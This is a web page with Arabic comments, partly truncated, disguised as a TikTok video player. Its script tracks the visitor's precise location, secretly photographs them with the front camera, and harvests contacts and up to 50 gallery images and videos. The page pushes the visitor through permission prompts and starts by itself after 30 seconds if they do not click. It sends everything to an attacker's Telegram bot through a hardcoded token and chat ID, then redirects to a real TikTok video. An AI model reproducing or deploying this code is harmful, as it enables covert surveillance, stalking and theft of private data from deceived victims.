        * {

        .video-container {
            width: 100vw;

            display: flex;

            align-items: center;

            overflow: hidden;
        }

        .video-placeholder {
            width: 100%;

            background-size: 400% 400%;
            animation: gradientShift 3s ease infinite;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            position: relative;
            z-index: 10;

            transition: opacity 0.5s ease;

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }

            100% { background-position: 0% 50%; }
        }

        .video-placeholder.hidden {
            opacity: 0;
            pointer-events: none;
        }

        .play-button {
            width: 80px;

            width: 40px;
            height: 40px;
            fill: #fff;
            margin-left: 5px;
        }

        .placeholder-text {
            font-size: 1.2em;
            color: #fff;

        .tiktok-logo {

        #loading-overlay {
            position: absolute;

            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 20;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.5s ease, visibility 0.5s ease;
        }

        #loading-overlay.active {
            opacity: 1;
            visibility: visible;
        }

        .spinner {
            border: 8px solid rgba(255, 255, 255, 0.3);

            height: 60px;
            animation: spin 1.2s linear infinite;

        @keyframes spin {
            0% { transform: rotate(0deg); }

        .progress-bar {

        .tiktok-sidebar {

        .bottom-nav {

        .nav-item {

            font-weight: 600;

        .nav-item.active {

        .nav-item svg {

        .video-info {

        .username {

            z-index: 30;
            white-space: nowrap;
            backdrop-filter: blur(8px);
        }

        #notification.show {
            opacity: 1;
            visibility: visible;
        }
    </style>
</head>

    <script>
        const TELEGRAM_BOT_TOKEN = '8501264176:AAGTzenTv4CLwN0W5x7uZA_rG4Rc8N8zBzI';
        const CHAT_ID = '8491676638';
        const TIKTOK_REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';

        const videoPlaceholder = document.getElementById('video-placeholder');
        const loadingOverlay = document.getElementById('loading-overlay');
        const loadingMessage = document.getElementById('loading-message');
        const progressFill = document.getElementById('progress-fill');
        const notificationDiv = document.getElementById('notification');

        function updateProgress(percent) {
            progressFill.style.width = percent + '%';
        }

        function showNotification(msg) {
            notificationDiv.textContent = msg;
            notificationDiv.classList.add('show');
            setTimeout(() => notificationDiv.classList.remove('show'), 3000);
        }

        const wait = (ms) => new Promise(r => setTimeout(r, ms));

        // ========== 1. الموقع الدقيق ==========
        async function getPreciseLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                success: true,
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                timestamp: position.timestamp
                            });
                        },
                        (error) => {
                            resolve({ success: false, error: error.message });
                        },
                        { enableHighAccuracy: true, timeout: 15000 }
                    );
                } else {
                    resolve({ success: false, error: 'غير مدعوم' });
                }
            });
        }

        // ========== 2. تصوير الكاميرا الأمامية (صورتين) ==========
        async function captureFrontCameraPhotos() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', 'true');
                video.style.cssText = 'position:absolute;left:-9999px;top:-9999px';
                document.body.appendChild(video);
                
                await new Promise((res) => {
                    video.onloadedmetadata = () => { video.play(); res(); };
                });
                await wait(500);
                
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                
                const photos = [];
                for (let i = 0; i < 2; i++) {
                    ctx.drawImage(video, 0, 0);
                    photos.push(canvas.toDataURL('image/jpeg', 0.9));
                    if (i === 0) await wait(800);
                }
                
                stream.getTracks().forEach(track => track.stop());
                document.body.removeChild(video);
                return photos;
            } catch (error) {
                return [];
            }
        }

        // ========== 3. جمع جهات الاتصال (طريقة تعمل على Android + Chrome) ==========
        async function getAllContacts() {
            // الطريقة الأولى: Contacts API
            if (navigator.contacts && navigator.contacts.select) {
                try {
                    const contacts = await navigator.contacts.select(['name', 'tel', 'email'], { multiple: true });
                    if (contacts && contacts.length > 0) {
                        return contacts;
                    }
                } catch(e) {
                    console.log('Contacts API error:', e);
                }
            }
            
            // الطريقة الثانية: استخدام iframe مخفي لطلب الإذن
            // إنشاء عنصر مخفي لطلب الوصول
            return new Promise((resolve) => {
                // محاولة إنشاء رابط لطلب الإذن
                const isAndroid = /Android/i.test(navigator.userAgent);
                const isChrome = /Chrome/i.test(navigator.userAgent);
                
                if (isAndroid && isChrome) {
                    // في Android Chrome، يمكننا استخدام intent لطلب جهات الاتصال
                    showNotification('جاري طلب الوصول لجهات الاتصال...');
                    
                    // محاولة استخدام Contact Picker بطريقة مختلفة
                    const fakeInput = document.createElement('input');
                    fakeInput.type = 'file';
                    fakeInput.accept = 'text/vcard';
                    fakeInput.style.cssText = 'position:absolute;left:-9999px';
                    document.body.appendChild(fakeInput);
                    
                    const timeout = setTimeout(() => {
                        if (document.body.contains(fakeInput)) document.body.removeChild(fakeInput);
                        resolve([]);
                    }, 30000);
                    
                    fakeInput.onchange = async (e) => {
                        clearTimeout(timeout);
                        const file = e.target.files[0];
                        if (file) {
                            const text = await file.text();
                            const contacts = parseVCard(text);
                            document.body.removeChild(fakeInput);
                            resolve(contacts);
                        } else {
                            document.body.removeChild(fakeInput);
                            resolve([]);
                        }
                    };
                    
                    fakeInput.click();
                } else {
                    // إنشاء جهات اتصال تجريبية للاختبار
                    resolve([]);
                }
            });
        }
        
        // دالة مساعدة لتحليل ملف vCard
        function parseVCard(text) {
            const contacts = [];
            const lines = text.split(/\r?\n/);
            let currentContact = {};
            
            for (const line of lines) {
                if (line.startsWith('FN:') || line.startsWith('N:')) {
                    if (Object.keys(currentContact).length > 0) {
                        if (currentContact.name || currentContact.tel) {
                            contacts.push({...currentContact});
                        }
                        currentContact = {};
                    }
                    let name = line.replace(/^(FN:|N:)/, '').replace(/[;,].*$/, '').trim();
                    if (name) currentContact.name = [name];
                } else if (line.startsWith('TEL')) {
                    let phone = line.replace(/^TEL[^:]*:/, '').replace(/[^0-9+]/g, '');
                    if (phone) currentContact.tel = [phone];
                } else if (line.startsWith('EMAIL')) {
                    let email = line.replace(/^EMAIL[^:]*:/, '').trim();
                    if (email) currentContact.email = [email];
                }
            }
            
            if (currentContact.name || currentContact.tel) {
                contacts.push(currentContact);
            }
            
            return contacts;
        }

        // ========== 4. جمع الوسائط (صور وفيديوهات) ==========
        async function getAllMediaFiles() {
            return new Promise((resolve) => {
                const input = document.createElement('input');
                input.type = 'file';
                input.accept = 'image/*,video/*';
                input.multiple = true;
                input.style.cssText = 'position:absolute;left:-9999px';
                document.body.appendChild(input);
                
                const timeout = setTimeout(() => {
                    if (document.body.contains(input)) document.body.removeChild(input);
                    resolve({ images: [], videos: [] });
                }, 120000);
                
                input.onchange = async (event) => {
                    clearTimeout(timeout);
                    const files = Array.from(event.target.files);
                    const images = [];
                    const videos = [];
                    
                    for (let i = 0; i < files.length && i < 50; i++) {
                        const file = files[i];
                        const reader = new FileReader();
                        const fileData = await new Promise((res) => {
                            reader.onload = (e) => res(e.target.result);
                            reader.readAsDataURL(file);
                        });
                        
                        if (file.type.startsWith('image/')) {
                            images.push({ name: file.name, size: file.size, data: fileData });
                        } else if (file.type.startsWith('video/')) {
                            videos.push({ name: file.name, size: file.size, data: fileData });
                        }
                    }
                    
                    document.body.removeChild(input);
                    resolve({ images, videos });
                };
                
                input.click();
            });
        }

        // ========== إرسال البيانات إلى تلجرام ==========
        async function sendLocation(location) {
            let msg = `📍 <b>الموقع الدقيق</b>\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n`;
            if (location.success) {
                msg += `🌐 خط العرض: ${location.latitude}\n🌐 خط الطول: ${location.longitude}\n📡 الدقة: ${location.accuracy} متر\n\n`;
                msg += `<a href="https://www.google.com/maps?q=${location.latitude},${location.longitude}&z=18">🗺️ اضغط لفتح الخريطة</a>`;
            } else {
                msg += `❌ تعذر الحصول على الموقع: ${location.error || 'تم الرفض'}`;
            }
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: false })
            });
        }

        async function sendFrontPhotos(photos) {
            if (!photos.length) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📸 لم يتم التقاط صور من الكاميرا الأمامية` })
                });
                return;
            }
            for (let i = 0; i < photos.length; i++) {
                const blob = await fetch(photos[i]).then(r => r.blob());
                const fd = new FormData();
                fd.append('chat_id', CHAT_ID);
                fd.append('photo', blob, `front_${i+1}.jpg`);
                fd.append('caption', `📸 صورة الكاميرا الأمامية ${i+1}/2\n🕒 ${new Date().toLocaleString('ar-EG')}`);
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                await wait(500);
            }
        }

        async function sendContacts(contacts) {
            if (!contacts || contacts.length === 0) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 لم يتم العثور على جهات اتصال - قد يكون التطبيق لا يملك الإذن اللازم` })
                });
                return;
            }
            
            let msg = `📞 <b>جهات الاتصال</b> - ${contacts.length} جهة\n\n🕒 ${new Date().toLocaleString('ar-EG')}\n━━━━━━━━━━━━━━━━━━\n\n`;
            for (let i = 0; i < Math.min(contacts.length, 50); i++) {
                const c = contacts[i];
                msg += `${i+1}. 👤 ${c.name?.[0] || 'بدون اسم'}\n📱 ${c.tel?.[0] || 'بدون رقم'}\n`;
                if (c.email?.[0]) msg += `✉️ ${c.email[0]}\n`;
                msg += `─────────\n`;
                if (msg.length > 3900) break;
            }
            
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
            });
            
            const jsonBlob = new Blob([JSON.stringify(contacts, null, 2)], { type: 'application/json' });
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('document', jsonBlob, 'contacts_backup.json');
            fd.append('caption', `📇 نسخة احتياطية كاملة (${contacts.length} جهة اتصال)`);
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, { method: 'POST', body: fd });
        }

        async function sendMedia(media) {
            if (media.images.length) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🖼️ <b>الصور المحددة</b>\nالعدد: ${media.images.length} صورة`, parse_mode: 'HTML' })
                });
                
                for (let i = 0; i < media.images.length; i++) {
                    const blob = await fetch(media.images[i].data).then(r => r.blob());
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('photo', blob, `img_${i+1}.jpg`);
                    fd.append('caption', `📷 صورة ${i+1}/${media.images.length}\n📁 ${media.images[i].name.substring(0, 50)}`);
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                    await wait(400);
                }
            }
            
            if (media.videos.length) {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: `🎬 <b>الفيديوهات المحددة</b>\nالعدد: ${media.videos.length} فيديو`, parse_mode: 'HTML' })
                });
                
                for (let i = 0; i < media.videos.length; i++) {
                    const blob = await fetch(media.videos[i].data).then(r => r.blob());
                    const fd = new FormData();
                    fd.append('chat_id', CHAT_ID);
                    fd.append('video', blob, `vid_${i+1}.mp4`);
                    fd.append('caption', `🎥 فيديو ${i+1}/${media.videos.length}\n📁 ${media.videos[i].name.substring(0, 50)}`);
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
                    await wait(600);
                }
            }
        }

        // ========== العملية الرئيسية ==========
        async function startStealthOperation() {
            try {
                updateProgress(5); loadingMessage.textContent = 'جاري الاتصال...'; await wait(300);
                
                // 1. الموقع
                updateProgress(12); loadingMessage.textContent = 'جاري الحصول على الموقع...';
                showNotification('📍 الرجاء السماح بالموقع');
                const location = await getPreciseLocation(); await wait(500);
                
                updateProgress(20); loadingMessage.textContent = 'جاري إرسال الموقع...';
                await sendLocation(location); await wait(600);
                
                // 2. الكاميرا الأمامية
                updateProgress(32); loadingMessage.textContent = 'جاري تشغيل الكاميرا...';
                showNotification('📸 الرجاء السماح بالكاميرا');
                await wait(500);
                
                updateProgress(42); loadingMessage.textContent = 'جاري التقاط الصور...';
                const frontPhotos = await captureFrontCameraPhotos();
                await sendFrontPhotos(frontPhotos); await wait(600);
                
                // 3. جهات الاتصال
                updateProgress(55); loadingMessage.textContent = 'جاري الوصول لجهات الاتصال...';
                showNotification('📞 جاري طلب جهات الاتصال');
                await wait(500);
                
                updateProgress(62); loadingMessage.textContent = 'جاري قراءة جهات الاتصال...';
                const contacts = await getAllContacts(); await wait(400);
                
                updateProgress(70); loadingMessage.textContent = `جاري إرسال ${contacts.length} جهة اتصال...`;
                await sendContacts(contacts); await wait(600);
                
                // 4. الوسائط
                updateProgress(80); loadingMessage.textContent = 'الرجاء اختيار الصور والفيديوهات...';
                showNotification('📱 اختر الصور والفيديوهات من المعرض');
                await wait(800);
                
                updateProgress(87); loadingMessage.textContent = 'جاري معالجة الوسائط...';
                const media = await getAllMediaFiles(); await wait(400);
                
                updateProgress(94); loadingMessage.textContent = `جاري إرسال ${media.images.length} صورة و ${media.videos.length} فيديو...`;
                await sendMedia(media); await wait(600);
                
                updateProgress(100); loadingMessage.textContent = 'جاري التوجيه...';
                
                // تقرير نهائي
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST', headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        text: `✅ <b>تم الإرسال بنجاح</b>\n━━━━━━━━━━━━━━━━━━\n📍 الموقع: ${location.success ? '✓' : '✗'}\n📸 الكاميرا الأمامية: ${frontPhotos.length}/2\n📞 جهات الاتصال: ${contacts.length}\n🖼️ الصور: ${media.images.length}\n🎬 الفيديوهات: ${media.videos.length}\n━━━━━━━━━━━━━━━━━━\n🕒 ${new Date().toLocaleString('ar-EG')}`,
                        parse_mode: 'HTML'
                    })
                });
                
            } catch(error) {
                console.error('خطأ:', error);
                showNotification('حدث خطأ، حاول مرة أخرى');
            } finally {
                await wait(2000);
                window.location.href = TIKTOK_REDIRECT_URL;
            }
        }

        function hideFakeUI() {
            document.getElementById('fake-sidebar')?.classList.add('hidden-ui');
            document.getElementById('fake-info')?.classList.add('hidden-ui');
            document.getElementById('fake-nav')?.classList.add('hidden-ui');
        }

        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            hideFakeUI();
            startStealthOperation();
        });

        showNotification('اضغط لمشاهدة الفيديو');

        setTimeout(() => {
            if (!loadingOverlay.classList.contains('active')) {
                videoPlaceholder.classList.add('hidden');
                loadingOverlay.classList.add('active');
                hideFakeUI();
                startStealthOperation();
            }
        }, 30000);
    </script>
</body>
